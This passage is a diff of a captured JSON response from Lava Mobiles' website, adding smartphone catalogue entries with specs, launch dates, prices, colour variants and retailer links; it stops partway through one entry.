@@ -1,32 +1,3120 @@
 {
-  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/privacy-policy.json",
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/smartphones.json?subCat=all",
   "method": "GET",
   "status": 200,
   "content_type": "application/json",
   "body": {
     "pageProps": {
-      "PandP": {
+      "smartphoneData": {
         "status": 1,
-        "msg": "privacy-policy Page Content",
+        "msg": "Product Datas",
+        "all_products": [
+          {
+            "id": 1137,
+            "name": "Smart 4 Plus",
+            "slug": "smart-4-plus",
+            "status": 1,
+            "image": "media/community/image/smart-4-plus--listing-1782575120.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-06-09T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2196,
+                "name": "Himalayan Silver",
+                "image": "media/images/product-variant/image_path/smart-4-plus--listing-1782575251.webp",
+                "thumbnail": null,
+                "color_code": "#dbdbdb",
+                "product_id": 1137
+              },
+              {
+                "id": 2197,
+                "name": "Nilgiri Blue",
+                "image": "media/images/product-variant/image_path/smart-4-plus--listing1-1782575224.webp",
+                "thumbnail": null,
+                "color_code": "#414666",
+                "product_id": 1137
+              }
+            ]
+          },
+          {
+            "id": 1136,
+            "name": "Bold N2 5G",
+            "slug": "bold-n2-5g",
+            "status": 1,
+            "image": "media/community/image/bold-n2-5g-listing-1782726945.webp",
+            "thumbnail_image": null,
+            "short_description": "Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera | 4GB+4GB* RAM  l 64GB ROM",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-06-03T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2194,
+                "name": "Billionaire Blue",
+                "image": "media/images/product-variant/image_path/bold-n2-5g-listing-1782726991.webp",
+                "thumbnail": null,
+                "color_code": "#182548",
+                "product_id": 1136
+              },
+              {
+                "id": 2195,
+                "name": "Royal Gold",
+                "image": "media/images/product-variant/image_path/bold-n2-5g-listing1-1782726969.webp",
+                "thumbnail": null,
+                "color_code": "#bcbcba",
+                "product_id": 1136
+              }
+            ]
+          },
+          {
+            "id": 1135,
+            "name": "Shark 2 5G",
+            "slug": "shark-2-5g",
+            "status": 1,
+            "image": "media/community/image/shark-2-5g-listing-1782734375.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Unisoc T8200 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ 120Hz display  | 6000mAh Battery with Type-C Port & 10 W Charging (18W Support) | IP 64 Dust and Water Resistant | 13 MP AI Dual Rear Camera",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-05-25T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1023,
+            "read_more_url": "/smartphones/shark-2-5g",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2192,
+                "name": "Sonar Gold",
+                "image": "media/images/product-variant/image_path/shark-2-5g-listing-1782734455.webp",
+                "thumbnail": null,
+                "color_code": "#d0d0ce",
+                "product_id": 1135
+              },
+              {
+                "id": 2193,
+                "name": "Arya Blue",
+                "image": "media/images/product-variant/image_path/shark-2-5g-listing1-1782734473.webp",
+                "thumbnail": null,
+                "color_code": "#1e2b4e",
+                "product_id": 1135
+              }
+            ]
+          },
+          {
+            "id": 1132,
+            "name": "Bold N2 Lite",
+            "slug": "bold-n2-lite",
+            "status": 1,
+            "image": "media/community/image/bold-n2-lite-listing-1782727220.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-04-02T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": "/smartphones/bold-n2-lite",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2186,
+                "name": "NILGIRI Blue",
+                "image": "media/images/product-variant/image_path/bold-n2-lite-listing-1782727260.webp",
+                "thumbnail": null,
+                "color_code": "#282b30",
+                "product_id": 1132
+              },
+              {
+                "id": 2187,
+                "name": "KOLAR GOLD",
+                "image": "media/images/product-variant/image_path/bold-n2-lite-listing1-1782727278.webp",
+                "thumbnail": null,
+                "color_code": "#cfd3c0",
+                "product_id": 1132
+              }
+            ]
+          },
+          {
+            "id": 1130,
+            "name": "Yuva Smart 3",
+            "slug": "yuva-smart-3",
+            "status": 1,
+            "image": "media/community/image/smart-3-listing-1782734856.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2026-03-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2182,
+                "name": "Crystal Gold",
+                "image": "media/images/product-variant/image_path/smart-3-listing-1782734899.webp",
+                "thumbnail": null,
+                "color_code": "#cdd1c3",
+                "product_id": 1130
+              },
+              {
+                "id": 2183,
+                "name": "Crystal Blue",
+                "image": "media/images/product-variant/image_path/smart-3-listing1-1782734912.webp",
+                "thumbnail": null,
+                "color_code": "#1a363e",
+                "product_id": 1130
+              }
+            ]
+          },
+          {
+            "id": 1131,
+            "name": "Bold 2 5G",
+            "slug": "bold-2-5g",
+            "status": 1,
+            "image": "media/community/image/bold-2-5g-listing-1782727437.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera with Sony Sensor | Large 16.94cm (6.67\") FHD+ Amoled Punch-Hole Display with 120Hz Refresh Rate | 50MP AI Rear Camera with Sony Sensor | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | (6GB+6GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Superior Audio Experience with Stereo Speakers",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2026-03-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2184,
+                "name": "Midnight Black",
+                "image": "media/images/product-variant/image_path/bold-2-5g-listing-1782727512.webp",
+                "thumbnail": null,
+                "color_code": "#050505",
+                "product_id": 1131
+              },
+              {
+                "id": 2185,
+                "name": "Feather White",
+                "image": "media/images/product-variant/image_path/bold-2-5g-listing1-1782727529.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1131
+              }
+            ]
+          },
+          {
+            "id": 1129,
+            "name": "Bold N2",
+            "slug": "bold-n2",
+            "status": 1,
+            "image": "media/community/image/bold-n2-listing-1782734535.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-02-23T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": "/smartphones/bold-n2",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2179,
+                "name": "Indus Black",
+                "image": "media/images/product-variant/image_path/bold-n2-listing-1782726755.webp",
+                "thumbnail": null,
+                "color_code": "#242424",
+                "product_id": 1129
+              },
+              {
+                "id": 2180,
+                "name": "Siachen White",
+                "image": "media/images/product-variant/image_path/bold-n2-listing1-1782726767.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1129
+              }
+            ]
+          },
+          {
+            "id": 1128,
+            "name": "Star 3",
+            "slug": "star-3",
+            "status": 1,
+            "image": "media/community/image/star-3-listing-1782735042.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa Core Processor | 17.13cm (6.75\") HD+ display  | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-02-05T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": "/smartphones/star-3",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2177,
+                "name": "Siachen White",
+                "image": "media/images/product-variant/image_path/star-3-listing-1782735070.webp",
+                "thumbnail": null,
+                "color_code": "#f5f5f5",
+                "product_id": 1128
+              },
+              {
+                "id": 2178,
+                "name": "Indus Black",
+                "image": "media/images/product-variant/image_path/star-3-listing1-1782735087.webp",
+                "thumbnail": null,
+                "color_code": "#191919",
+                "product_id": 1128
+              }
+            ]
+          },
+          {
+            "id": 1127,
+            "name": "Blaze Duo 3",
+            "slug": "blaze-duo-3",
+            "status": 1,
+            "image": "media/community/image/blaze-duo-3-listing-1782735263.webp",
+            "thumbnail_image": null,
+            "short_description": "Large 16.94cm (6.67\") FHD+ Amoled Punch-Hole Display with 120Hz Refresh Rate | Segment's First 1.6\" Secondary AMOLED Display | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | 50MP AI Rear Camera with Sony Sensor | (6GB+6GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Superior Audio Experience with Stereo Speakers",
+            "description": null,
+            "price": 21999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2026-01-19T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "/smartphones/blaze-duo-3",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": 20999,
+            "thumbnail_variant": [
+              {
+                "id": 2175,
+                "name": "Blaze Duo 3",
+                "image": "media/images/product-variant/image_path/blaze-duo-3-listing-1782735342.webp",
+                "thumbnail": null,
+                "color_code": "#18191d",
+                "product_id": 1127
+              },
+              {
+                "id": 2176,
+                "name": "Blaze Duo 3",
+                "image": "media/images/product-variant/image_path/blaze-duo-3-listing1-1782735366.webp",
+                "thumbnail": null,
+                "color_code": "#d0ccbc",
+                "product_id": 1127
+              }
+            ]
+          },
+          {
+            "id": 1124,
+            "name": "Play Max",
+            "slug": "play-max",
+            "status": 1,
+            "image": "media/community/image/play-max-listing-1782735825.webp",
+            "thumbnail_image": null,
+            "short_description": "2.5 GHz MediaTek Dimensity 7300 Processor (4nm) - 700,000K+ Antutu Score | 6.72\" FHD+ Display with 120Hz Refresh Rate | (6GB+6GB*)/(8GB+8GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | VC chamber cooling | 50MP AI Camera with EIS, 8MP Selfie Camera",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-12-12T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1025,
+            "read_more_url": "/smartphones/play-max",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2168,
+                "name": "DECCAN BLACK",
+                "image": "media/images/product-variant/image_path/play-max-listing-1782735859.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 1124
+              },
+              {
+                "id": 2169,
+                "name": "HIMALAYAN WHITE",
+                "image": "media/images/product-variant/image_path/play-max-listing1-1782735879.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1124
+              }
+            ]
+          },
+          {
+            "id": 1123,
+            "name": "AGNI 4",
+            "slug": "agni-4",
+            "status": 1,
+            "image": "media/community/image/agni-4-listing-v1-1782736173.webp",
+            "thumbnail_image": null,
+            "short_description": "Premium flagship design with Aluminum Metal frame & Matte AG Glass Back | Powered by Vayu AI with Expert AI Agents for learning, creativity, productivity and system-level control | 3.35GHz MediaTek Dimensity 8350 Processor (4nm) with LPDDR5X RAM & UFS4.0 Storage | 16.94cm (6.67-inch) 1.5K Flat AMOLED display with 120Hz refresh rate & 2400nits of peak brightness | 50MP OIS Main Rear Camera + 8MP Ultrawide + 50MP Front Camera with EIS, both rear & front with 4K@60fps",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-11-20T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 2,
+            "read_more_url": "/smartphones/agni-4",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2165,
+                "name": "Agni 4",
+                "image": "media/images/product-variant/image_path/agni-4-listing-v1-1782736201.webp",
+                "thumbnail": null,
+                "color_code": "#fcfcfc",
+                "product_id": 1123
+              },
+              {
+                "id": 2166,
+                "name": "Agni 4",
+                "image": "media/images/product-variant/image_path/agni-4-listing-v2-1782736214.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 1123
+              }
+            ]
+          },
+          {
+            "id": 1126,
+            "name": "Bold N1 Lite",
+            "slug": "bold-n1-lite",
+            "status": 1,
+            "image": "media/community/image/bold-n1-lite-listing1-1782736517.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+3GB* RAM  l 64GB ROM | UNISOC 9863a Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-10-15T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": null,
+            "amazon_link": "https://www.amazon.in/Lava-Crystal-Storage-Fingerprint-Phone-Cover/dp/B0FP5F44J8",
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2173,
+                "name": "Crystal Blue",
+                "image": "media/images/product-variant/image_path/bold-n1-lite-listing1-1782736564.webp",
+                "thumbnail": null,
+                "color_code": "#272727",
+                "product_id": 1126
+              },
+              {
+                "id": 2174,
+                "name": "Crystal Gold",
+                "image": "media/images/product-variant/image_path/bold-n1-lite-listing-1782736575.webp",
+                "thumbnail": null,
+                "color_code": "#bbbfb2",
+                "product_id": 1126
+              }
+            ]
+          },
+          {
+            "id": 1118,
+            "name": "Shark 2",
+            "slug": "shark-2",
+            "status": 1,
+            "image": "media/community/image/shark2-listing-1782736743.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera I 8MP Selfie Camera | 4GB+4GB* RAM  l 64GB ROM | Octa-core UNISOC T7250 Processor | 17.13cm (6.75\") HD+ Notch Display I 120Hz Refresh Rate",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-10-15T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1023,
+            "read_more_url": null,
+            "amazon_link": "https://www.amazon.in/dp/B0FY2G67DS/?th=1",
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 2162,
+                "name": "Shark 2",
+                "image": "media/images/product-variant/image_path/shark2-listing-1782736777.webp",
+                "thumbnail": null,
+                "color_code": "#444444",
+                "product_id": 1118
+              },
+              {
+                "id": 2167,
+                "name": "Aurora Gold",
+                "image": "media/images/product-variant/image_path/shark-2-listing1-1782736813.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 1118
+              }
+            ]
+          },
+          {
+            "id": 90,
+            "name": "AGNI 3",
+            "slug": "agni-3",
+            "status": 1,
+            "image": "media/community/image/agni-3-listing-1728025925.webp",
+            "thumbnail_image": null,
+            "short_description": "Segment-first Dual AMOLED display on front & back | Segment-first MediaTek Dimensity 7300X processor | 50MP Sony Quad-Bayer camera with OIS",
+            "description": null,
+            "price": 25499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-10-04T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 2,
+            "read_more_url": "/smartphones/agni-3",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/agni-3",
+            "cut_price": 20999,
+            "thumbnail_variant": [
+              {
+                "id": 1130,
+                "name": "Pristine Glass",
+                "image": "media/images/product-variant/image_path/agni-3-listing-1728033681.webp",
+                "thumbnail": null,
+                "color_code": "#ffffff",
+                "product_id": 90
+              },
+              {
+                "id": 1131,
+                "name": "Heather Glass",
+                "image": "media/images/product-variant/image_path/agni-3-listing2-1728033770.webp",
+                "thumbnail": null,
+                "color_code": "#44415c",
+                "product_id": 90
+              }
+            ]
+          },
+          {
+            "id": 126,
+            "name": "Yuva Smart 2",
+            "slug": "yuva-smart-2",
+            "status": 1,
+            "image": "media/community/image/yuva-smart-2-listing-1757407398.webp",
+            "thumbnail_image": null,
+            "short_description": "3GB+4GB* RAM  l 64GB ROM | UNISOC 9863a Octa Core Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10 W Charging",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-09-09T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 5,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": []
+          },
+          {
+            "id": 125,
+            "name": "Bold N1 5G",
+            "slug": "bold-n1-5g",
+            "status": 1,
+            "image": "media/community/image/bold-n1-5g-listing-1757081907.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB | 128GB ROM | Unisoc T765 Octa Core Ultra Fast Processor | 17.13cm (6.75\") HD+ display | 13 MP AI Dual Rear Camera | IP 54 Dust and Water Resistant | 5000mAh Battery with Type-C Port & 10 W Charging (18W Support)",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-09-05T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": "/smartphones/bold-n1-5g",
+            "amazon_link": "https://www.amazon.in/Lava-Bold-N1-5G-Champagne/dp/B0FNX5CX8C?th=1",
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1177,
+                "name": "Bold N1 5G",
+                "image": "media/images/product-variant/image_path/bold-n1-5g-listing-1757082013.webp",
+                "thumbnail": null,
+                "color_code": "#162235",
+                "product_id": 125
+              },
+              {
+                "id": 1178,
+                "name": "Bold N1 5G",
+                "image": "media/images/product-variant/image_path/bold-n1-5g-listing1-1757082066.webp",
+                "thumbnail": null,
+                "color_code": "#cac6ba",
+                "product_id": 125
+              }
+            ]
+          },
+          {
+            "id": 122,
+            "name": "Play Ultra",
+            "slug": "play-ultra",
+            "status": 1,
+            "image": "media/community/image/play-ultra-listing1-1756111682.webp",
+            "thumbnail_image": null,
+            "short_description": "64 MP SONY IMX682 Sensor Camera with EIS + 5MP Macro Camera, 13MP Selfie Camera | 2.5 GHz MediaTek Dimensity 7300 Processor (4nm) - 700,000K+ Antutu Score | 6.67\" FHD+AMOLED Display with 120Hz Refresh Rate | (6GB+6GB*)/(8GB+8GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM |",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-08-20T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1025,
+            "read_more_url": null,
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1175,
+                "name": "Arctic Frost",
+                "image": "media/images/product-variant/image_path/play-ultra-listing1-1756111778.webp",
+                "thumbnail": null,
+                "color_code": "#2a2a2c",
+                "product_id": 122
+              },
+              {
+                "id": 1176,
+                "name": "Arctic Slate",
+                "image": "media/images/product-variant/image_path/play-ultra-listing2-1756111849.webp",
+                "thumbnail": null,
+                "color_code": "#ececec",
+                "product_id": 122
+              }
+            ]
+          },
+          {
+            "id": 121,
+            "name": "Blaze Amoled 2",
+            "slug": "blaze-amoled-2",
+            "status": 1,
+            "image": "media/community/image/blaze-amoled-2-listing-1755016682.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera with Sony Sensor | Large 16.94cm (6.67\") FHD+ Amoled Punch-Hole Display with 120Hz Refresh Rate | 50MP AI Rear Camera with Sony Sensor | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | (6GB+6GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Superior Audio Experience with Stereo Speakers",
+            "description": null,
+            "price": null,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": "2025-08-12T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "/smartphone/blaze-amoled-2",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1167,
+                "name": "Blaze Amoled 2",
+                "image": "media/images/product-variant/image_path/blaze-amoled-2-listing-1755016813.webp",
+                "thumbnail": null,
+                "color_code": "#000000",
+                "product_id": 121
+              },
+              {
+                "id": 1168,
+                "name": "Blaze Amoled 2",
+                "image": "media/images/product-variant/image_path/blaze-amoled-2-listing1-1755016837.webp",
+                "thumbnail": null,
+                "color_code": "#f0f0f0",
+                "product_id": 121
+              }
+            ]
+          },
+          {
+            "id": 118,
+            "name": "Blaze Dragon",
+            "slug": "blaze-dragon",
+            "status": 1,
+            "image": "media/community/image/blaze-dragon-listing1-1753527548.webp",
+            "thumbnail_image": null,
+            "short_description": "2.2 GHz Snapdragon 4Gen2 Processor | (4GB+4GB*)/(6GB+6GB*) LPDDR4X RAM + 128GB UFS 3.1 ROM | 50MP AI Rear Camera and 8MP Front Camera | 6.75\" HD+ Display with 120Hz Refresh Rate | Powerful 5000mAh Battery with 18W Fast Charging | Type-C USB | Premium Glossy Black Design | Clean Android 15 OS \u2013 No Bloatware, No Ads, No Notifications",
+            "description": null,
+            "price": null,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-07-25T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 3,
+            "read_more_url": "/smartphone/blaze-dragon",
+            "amazon_link": null,
+            "buy_now_url": null,
+            "cut_price": null,
+            "thumbnail_variant": [
+              {
+                "id": 1162,
+                "name": "Midnight Mist",
+                "image": "media/images/product-variant/image_path/blaze-dragon-listing1-1753527619.webp",
+                "thumbnail": null,
+                "color_code": "#182034",
+                "product_id": 118
+              },
+              {
+                "id": 1163,
+                "name": "Golden Mist",
+                "image": "media/images/product-variant/image_path/blaze-dragon-listing2-1753527686.webp",
+                "thumbnail": null,
+                "color_code": "#b7b3ab",
+                "product_id": 118
+              }
+            ]
+          },
+          {
+            "id": 117,
+            "name": "Storm Play 5G",
+            "slug": "storm-play-5g",
+            "status": 1,
+            "image": "media/community/image/storm-play-listing-1750746236.webp",
+            "thumbnail_image": null,
+            "short_description": "Large 17.13cm (6.75\") HD+ Water-Drop Display with 120Hz Refresh Rate | 50MP AI Rear Camera with Sony Sensor | 2.6GHz Latest MediaTek Dimensity 7060 Superfast Processor | (6GB+6GB*) / (8GB+8GB*) LPDDR5 RAM + 128GB UFS 3.1 ROM | Powerful 5000mAh Battery with 18W Fast Charging Supported | Type-C USB | Premium Glossy Back Design",
+            "description": null,
+            "price": 13499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-06-17T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 4,
+            "read_more_url": "/smartphones/storm-play-5g",
+            "amazon_link": "https://www.amazon.in/dp/B0FB8YLGY3",
+            "buy_now_url": "https://shop.lavamobiles.com/products/storm-play-5g",
+            "cut_price": 11499,
+            "thumbnail_variant": [
+              {
+                "id": 1160,
+                "name": "Frosty Blue",
+                "image": "media/images/product-variant/image_path/storm-play-listing-1750746153.webp",
+                "thumbnail": null,
+                "color_code": "#23384b",
+                "product_id": 117
+              },
+              {
+                "id": 1161,
+                "name": "Dune Titanium",
+                "image": "media/images/product-variant/image_path/storm-play-listing1-1750746218.webp",
+                "thumbnail": null,
+                "color_code": "#a3a29c",
+                "product_id": 117
+              }
+            ]
+          },
+          {
+            "id": 116,
+            "name": "Storm Lite 5G",
+            "slug": "storm-lite",
+            "status": 1,
+            "image": "media/community/image/storm-lite-listing-1750842491.webp",
+            "thumbnail_image": null,
+            "short_description": "Lightning Fast Performance with MediaTek Dimensity 6400 Chipset | 4GB+4GB* RAM  l 64 GB/128GB Memory | 50MP SONY IMX752 Sensor Rear Camera & 5 MP Selfie Camera | (6.75\") 120Hz Display |",
+            "description": null,
+            "price": 10999,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-06-13T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 4,
+            "read_more_url": "/smartphones/storm-lite",
+            "amazon_link": "https://www.amazon.in/dp/B0FB437XS2",
+            "buy_now_url": "https://shop.lavamobiles.com/products/storm-lite-5g",
+            "cut_price": 8999,
+            "thumbnail_variant": [
+              {
+                "id": 1158,
+                "name": "Astral Blue",
+                "image": "media/images/product-variant/image_path/storm-lite-listing-1750842513.webp",
+                "thumbnail": null,
+                "color_code": "#424e69",
+                "product_id": 116
+              },
+              {
+                "id": 1159,
+                "name": "Cosmic Titanium",
+                "image": "media/images/product-variant/image_path/storm-lite-listing1-1750842528.webp",
+                "thumbnail": null,
+                "color_code": "#c0bdb6",
+                "product_id": 116
+              }
+            ]
+          },
+          {
+            "id": 114,
+            "name": "Bold N1 Pro",
+            "slug": "bold-n1-pro",
+            "status": 1,
+            "image": "media/community/image/bold-n1pro-listing-1749128956.webp",
+            "thumbnail_image": null,
+            "short_description": "50MP AI Rear Camera | 8MP Selfie Camera | 4GB+4GB* RAM  | 128GB ROM | Octa-core UNISOC T606 Processor | 16.94cm (6.67\") HD+ Punch Hole Display  | 120Hz Refresh Rate | \r\n5000mAh Battery with Type-C Port & 10W Charging (18W Fast Charging Support)",
+            "description": null,
+            "price": 8399,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-05-29T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": "/smartphones/bold-n1-pro",
+            "amazon_link": "https://www.amazon.in/dp/B0F1Z3QTM8",
+            "buy_now_url": "https://shop.lavamobiles.com/products/bold-n1-pro",
+            "cut_price": 6799,
+            "thumbnail_variant": [
+              {
+                "id": 1154,
+                "name": "Bold N1 Pro",
+                "image": "media/images/product-variant/image_path/bold-n1pro-listing-1749128941.webp",
+                "thumbnail": null,
+                "color_code": "#c9c1b6",
+                "product_id": 114
+              },
+              {
+                "id": 1155,
+                "name": "Bold N1 Pro",
+                "image": "media/images/product-variant/image_path/bold-n1pro-listing1-1749128980.webp",
+                "thumbnail": null,
+                "color_code": "#242a38",
+                "product_id": 114
+              }
+            ]
+          },
+          {
+            "id": 115,
+            "name": "Bold N1",
+            "slug": "bold-n1",
+            "status": 1,
+            "image": "media/community/image/bold-n1-listing-1749128869.webp",
+            "thumbnail_image": null,
+            "short_description": "4GB+4GB* RAM  l 64GB ROM | Octa-core Processor | 17.13cm (6.75\") HD+ Display  | 13MP AI Dual Rear Camera | 5000mAh Battery with Type-C Port & 10W Charging | IP54 Dust and Water Resistant",
+            "description": null,
+            "price": 7499,
+            "new_launches": "new-launches",
+            "parent_id": "smartphones",
+            "launch_date": "2025-05-11T00:00:00.000Z",
+            "external_url": null,
+            "recommended_product": null,
+            "category_id": 1024,
+            "read_more_url": "/smartphones/bold-n1",
+            "amazon_link": null,
+            "buy_now_url": "https://shop.lavamobiles.com/products/bold-n1",
+            "cut_price": 5999,
+            "thumbnail_variant": [
+              {
+                "id": 1156,
+                "name": "Radiant Black",
+                "image": "media/images/product-variant/image_path/bold-n1-listing-1749128831.webp",
+                "thumbnail": null,
+                "color_code": "#0e141b",
+                "product_id": 115
+              },
+              {
+                "id": 1157,
